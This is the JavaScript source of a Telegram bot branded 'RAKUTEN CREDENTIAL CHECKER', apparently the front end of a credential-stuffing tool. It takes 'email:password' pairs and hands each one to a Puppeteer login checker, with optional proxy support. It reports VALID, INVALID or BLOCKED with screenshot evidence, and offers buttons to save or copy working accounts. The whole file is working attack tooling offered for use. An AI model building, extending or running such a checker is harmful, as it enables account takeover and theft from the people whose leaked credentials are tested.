const { Telegraf, Markup } = require('telegraf');
const { checkCredentials } = require('./puppeteerChecker');

/**
 * Validates and parses the credential string format "user:pass".
 * @param {string} credentialString - Raw credential string
 * @returns {Object|null} { username, password } or null if invalid
 */
function parseCredentials(credentialString) {
  if (!credentialString || typeof credentialString !== 'string') {
    return null;
  }

  const parts = credentialString.split(':');
  if (parts.length !== 2 || !parts[0].trim() || !parts[1].trim()) {
    return null;
  }

  return {
    username: parts[0].trim(),
    password: parts[1].trim(),
  };
}

/**
 * Validates email format.
 * @param {string} email - Email to validate
 * @returns {boolean} True if valid email format
 */
function isValidEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}

/**
 * Guards input for safety and valid format.
 * @param {string} credentialString - Raw credential string
 * @returns {Object} { valid: boolean, error?: string }
 */
function guardInput(credentialString) {
  if (!credentialString) {
    return { valid: false, error: 'Credential string is required.' };
  }

  if (credentialString.length > 200) {
    return { valid: false, error: 'Credential string too long (max 200 characters).' };
  }

  if (credentialString.length < 5) {
    return { valid: false, error: 'Credential string too short.' };
  }

  if (!credentialString.includes(':')) {
    return { valid: false, error: 'Format must be: `.chk email:password`' };
  }

  const parts = credentialString.split(':');
  if (parts.length !== 2) {
    return { valid: false, error: 'Multiple colons detected. Use format: `email:password`' };
  }

  const creds = parseCredentials(credentialString);
  if (!creds) {
    return { valid: false, error: 'Invalid format. Use: `.chk email:password`' };
  }

  // Validate email format
  if (!isValidEmail(creds.username)) {
    return { valid: false, error: 'Invalid email format. Please provide a valid email address.' };
  }

  // Validate password length
  if (creds.password.length < 4) {
    return { valid: false, error: 'Password too short (minimum 4 characters).' };
  }

  if (creds.password.length > 100) {
    return { valid: false, error: 'Password too long (maximum 100 characters).' };
  }

  // Check for suspicious patterns
  if (creds.password.includes(' ')) {
    return { valid: false, error: 'Password contains spaces. Check your input.' };
  }

  return { valid: true };
}

/**
 * Formats a result object into a user-friendly Telegram message with markdown.
 * @param {Object} result - Result from checkCredentials
 * @param {string} result.status - Status code
 * @param {string} result.message - Status message
 * @param {string} [result.screenshot] - Optional screenshot path
 * @param {string} [username] - Username being checked (masked)
 * @returns {string} Formatted message for Telegram
 */
function formatResultMessage(result, username = null) {
  const statusEmoji = {
    VALID: '✅',
    INVALID: '❌',
    BLOCKED: '🔒',
    ERROR: '⚠️',
  };

  const statusText = {
    VALID: '*VALID CREDENTIALS*',
    INVALID: '*INVALID CREDENTIALS*',
    BLOCKED: '*ACCOUNT BLOCKED*',
    ERROR: '*ERROR OCCURRED*',
  };

  const emoji = statusEmoji[result.status] || '❓';
  const status = statusText[result.status] || `*${result.status}*`;
  
  let message = `${emoji} ${status}\n\n`;
  
  if (username) {
    const maskedUser = username.length > 3 
      ? username.substring(0, 3) + '***' + username.substring(username.length - 2)
      : '***';
    message += `👤 Account: \`${maskedUser}\`\n\n`;
  }
  
  message += `📝 ${result.message}`;
  
  if (result.url) {
    message += `\n\n🔗 Final URL: \`${result.url.substring(0, 60)}...\``;
  }
  
  if (result.screenshot) {
    message += '\n\n📸 Screenshot attached';
  }
  
  return message;
}

/**
 * Initializes and sets up the Telegram handler.
 * @param {string} botToken - Telegram bot token
 * @param {Object} [options] - Optional configuration
 * @returns {Telegraf} Configured bot instance
 */
function initializeTelegramHandler(botToken, options = {}) {
  const bot = new Telegraf(botToken);

  // Handle /start command
  bot.start(async (ctx) => {
    await ctx.replyWithMarkdown(
      '🎌 *RAKUTEN CREDENTIAL CHECKER*\n\n' +
      '✨ Fast, secure, and automated validation\n\n' +
      '📖 *HOW TO USE:*\n' +
      '`.chk email:password`\n\n' +
      '💡 *EXAMPLE:*\n' +
      '`.chk user@example.com:mypass123`\n\n' +
      '🔒 *FEATURES:*\n' +
      '• Live status updates\n' +
      '• Screenshot evidence\n' +
      '• Masked credentials\n' +
      '• Inline action buttons\n\n' +
      '⚡ Ready to start!',
      Markup.inlineKeyboard([
        [Markup.button.callback('📚 Guide', 'guide'), Markup.button.callback('❓ Help', 'help')],
      ])
    );
  });

  // Handle /help command
  bot.command('help', async (ctx) => {
    await ctx.replyWithMarkdown(
      '❓ *HELP & SUPPORT*\n\n' +
      '*Format:* `.chk email:password`\n\n' +
      '*Status Indicators:*\n' +
      '✅ VALID - Credentials work\n' +
      '❌ INVALID - Wrong credentials\n' +
      '🔒 BLOCKED - Account locked\n' +
      '⚠️ ERROR - Technical issue\n\n' +
      '*Notes:*\n' +
      '• Max 200 characters\n' +
      '• Use colon to separate email:password\n' +
      '• Results are private to your chat'
    );
  });

  // Handle .chk command
  bot.hears(/^\.chk\s+(.+)/, async (ctx) => {
    const chatId = ctx.chat.id;
    const credentialString = ctx.match[1].trim();

    // Guard input
    const guard = guardInput(credentialString);
    if (!guard.valid) {
      await ctx.replyWithMarkdown(`❌ ${guard.error}`);
      return;
    }

    // Parse credentials
    const creds = parseCredentials(credentialString);
    if (!creds) {
      await ctx.replyWithMarkdown(
        '❌ Failed to parse credentials.\n\nFormat: `.chk username:password`'
      );
      return;
    }

    // Send processing message (will be edited later)
    const statusMsg = await ctx.replyWithMarkdown(
      '⏳ *CHECKING CREDENTIALS*\n\n🔄 Launching browser...'
    );

    try {
      // Update status: navigating
      await ctx.telegram.editMessageText(
        chatId,
        statusMsg.message_id,
        null,
        '⏳ *CHECKING CREDENTIALS*\n\n🌐 Navigating to login page...',
        { parse_mode: 'Markdown' }
      );

      // Check credentials
      const result = await checkCredentials(
        creds.username,
        creds.password,
        {
          timeoutMs: options.timeoutMs || 60000,
          proxy: options.proxy,
          screenshotOn: options.screenshotOn || false,
          targetUrl: options.targetUrl || process.env.TARGET_LOGIN_URL,
        }
      );

      // Format result message with masked username
      const resultMessage = formatResultMessage(result, creds.username);
      
      // Edit message with final result
      await ctx.telegram.editMessageText(
        chatId,
        statusMsg.message_id,
        null,
        resultMessage,
        { parse_mode: 'Markdown' }
      );

      // Send screenshot if available
      if (result.screenshot) {
        try {
          await ctx.replyWithPhoto(
            { source: result.screenshot },
            {
              caption: `📸 Evidence for ${result.status}`,
              reply_to_message_id: statusMsg.message_id,
            }
          );
        } catch (err) {
          console.error('Failed to send screenshot:', err.message);
        }
      }

      // Add inline keyboard for valid credentials
      if (result.status === 'VALID') {
        await ctx.reply(
          '💡 *Quick Actions*',
          {
            parse_mode: 'Markdown',
            reply_to_message_id: statusMsg.message_id,
            ...Markup.inlineKeyboard([
              [
                Markup.button.callback('✅ Save to File', 'save_valid'),
                Markup.button.callback('📋 Copy Account', 'copy_account'),
              ],
              [
                Markup.button.callback('🔄 Check Another', 'check_another'),
              ],
            ]),
          }
        );
      }
    } catch (err) {
      console.error('Credential check error:', err.message);
      
      // Edit status message to show error
      try {
        await ctx.telegram.editMessageText(
          chatId,
          statusMsg.message_id,
          null,
          `⚠️ *ERROR OCCURRED*\n\n❌ ${err.message}\n\n_Try again or contact support_`,
          { parse_mode: 'Markdown' }
        );
      } catch (editErr) {
        await ctx.replyWithMarkdown(
          `⚠️ *ERROR OCCURRED*\n\n❌ ${err.message}\n\n_Try again or contact support_`
        );
      }
    }
  });

  // Handle inline button callbacks
  bot.action('save_valid', async (ctx) => {
    await ctx.answerCbQuery('💾 Saving feature coming soon!');
  });

  bot.action('copy_account', async (ctx) => {
    await ctx.answerCbQuery('📋 Copy feature coming soon!');
  });

  bot.action('check_another', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(
      '🔄 Ready for another check!\n\nSend: `.chk email:password`'
    );
  });

  bot.action('guide', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(
      '📚 *QUICK GUIDE*\n\n' +
      '*1.* Type `.chk` followed by your credentials\n' +
      '*2.* Format: `email:password` (no spaces)\n' +
      '*3.* Wait for the check to complete\n' +
      '*4.* Review the result with evidence\n\n' +
      '✨ Bot edits the message in real-time!'
    );
  });

  bot.action('help', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(
      '❓ *NEED HELP?*\n\n' +
      'Send: `/help` for detailed instructions\n\n' +
      'Or just try:\n' +
      '`.chk test@example.com:password123`'
    );
  });

  // Launch bot
  bot.launch();
  
  console.log('✓ Bot launched successfully!');

  return bot;
}

module.exports = {
  initializeTelegramHandler,
  parseCredentials,
  guardInput,
  formatResultMessage,
  isValidEmail,
};
